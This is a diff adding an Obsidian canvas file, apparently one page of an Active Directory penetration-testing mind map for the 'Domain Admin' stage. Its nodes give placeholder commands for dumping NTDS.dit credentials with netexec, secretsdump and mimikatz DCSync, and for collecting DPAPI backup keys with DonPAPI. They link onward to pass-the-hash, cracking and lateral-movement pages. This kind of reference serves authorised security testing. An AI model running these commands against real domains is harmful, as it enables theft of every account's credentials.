@@ -1,0 +1,30 @@
+{
+	"nodes":[
+		{"id":"1749a8f38bc37882","type":"group","x":-920,"y":832,"width":2120,"height":1168,"color":"1","label":"DOMAIN ADMIN"},
+		{"id":"8c974d742ad27c5e","type":"group","x":-2120,"y":1025,"width":1080,"height":783,"label":"NO CREDENTIALS"},
+		{"id":"c28ee32530de46f5","type":"group","x":1440,"y":1034,"width":1080,"height":766,"color":"2","label":"CRACKING HASH"},
+		{"id":"658792d6f44b1283","type":"group","x":1440,"y":109,"width":1080,"height":760,"color":"4","label":"GOT CREDENTIALS"},
+		{"id":"4260c1274e0a5a8d","type":"group","x":1440,"y":2029,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
+		{"id":"6b64bbd07ba5047f","type":"text","text":"# Extract NTDS.dit\n\n\n>[!info] Theory\n>- [NTDS secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)\n\n\n>[!example] Tools\n>- [Netexec](https://github.com/Pennyw0rth/NetExec)\n>- [impacket's secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)\n\n\n```shell\n# Dumping with netexec ntds option\n🕷️ nxc smb '<dc_ip>' -u '<user>' -p '<password>' -d '<domain>' --ntds\n# Dumping with impacket's secretsdump\n🟣 secretsdump.py '<domain>'/'<user>':'<pass>'@'<ip>'\n# Dumping ntds with mimkatz\n🔵 mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator\n```","x":-320,"y":906,"width":920,"height":537},
+		{"id":"b4177b33f10c3b51","type":"text","text":"# PASS THE HASH","x":700,"y":1103,"width":300,"height":50,"color":"6"},
+		{"id":"43177856fed7efc1","type":"text","text":"# HASH FOUND (NT)","x":700,"y":1183,"width":340,"height":50,"color":"2"},
+		{"id":"44159b5c16e62f83","type":"text","text":"# Grab backup Keys \n\n>[!info] Theory\n>- [Donpapi](https://github.com/login-securite/DonPAPI/blob/main/assets/Login%20Se%CC%81curite%CC%81%20-%20DPAPI%20-%20Don't%20Put%20Administration%20Passwords%20In%20-%20LeHack%202023.pdf)\n\n\n>[!example] Tools\n>- [login-securité Donpapi](https://github.com/login-securite/DonPAPI)\n\n```shell\n⚪ donpapi collect - H ':<hash>' '<domain>'/'<user>@'<ip_range>' -t ALL --fetch-pvk\n```","x":-320,"y":1520,"width":920,"height":400},
+		{"id":"d28e57e65e22f8d7","type":"text","text":"# Domain Admin","x":-880,"y":1443,"width":311,"height":50,"color":"1"},
+		{"id":"a3216d4228f82579","type":"text","text":"# CREDENTIALS FOUND","x":700,"y":1695,"width":380,"height":50,"color":"4"},
+		{"id":"57ea4ba87b73dd64","type":"file","file":"INTERACTIVE-MAP.canvas","x":-2040,"y":1128,"width":920,"height":600},
+		{"id":"26c52adafd0f57f2","type":"file","file":"ATTACKS/GOT CREDENTIALS.canvas","x":1520,"y":189,"width":920,"height":600,"color":"4"},
+		{"id":"792215defce0efb3","type":"file","file":"ATTACKS/CRACKING HASH.canvas","x":1520,"y":1110,"width":920,"height":600,"color":"2"},
+		{"id":"a90cec33f9451d45","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":1520,"y":2111,"width":920,"height":600,"color":"6"}
+	],
+	"edges":[
+		{"id":"29adcf6934418b38","fromNode":"8c974d742ad27c5e","fromSide":"right","toNode":"1749a8f38bc37882","toSide":"left"},
+		{"id":"b10f65fd9d9cba26","fromNode":"1749a8f38bc37882","fromSide":"right","toNode":"658792d6f44b1283","toSide":"left","color":"4"},
+		{"id":"d86f0925a7db6b62","fromNode":"1749a8f38bc37882","fromSide":"right","toNode":"c28ee32530de46f5","toSide":"left","color":"2"},
+		{"id":"6559ce45a409d756","fromNode":"1749a8f38bc37882","fromSide":"right","toNode":"4260c1274e0a5a8d","toSide":"left","color":"6"},
+		{"id":"4c3af0de13041c77","fromNode":"d28e57e65e22f8d7","fromSide":"right","toNode":"6b64bbd07ba5047f","toSide":"left"},
+		{"id":"046b5c6482a716ca","fromNode":"d28e57e65e22f8d7","fromSide":"right","toNode":"44159b5c16e62f83","toSide":"left"},
+		{"id":"c36cf9a178432833","fromNode":"6b64bbd07ba5047f","fromSide":"right","toNode":"b4177b33f10c3b51","toSide":"left"},
+		{"id":"7932369c3e4f0d5f","fromNode":"6b64bbd07ba5047f","fromSide":"right","toNode":"43177856fed7efc1","toSide":"left"},
+		{"id":"c29b8bd419502649","fromNode":"44159b5c16e62f83","fromSide":"right","toNode":"a3216d4228f82579","toSide":"left"}
+	]
+}
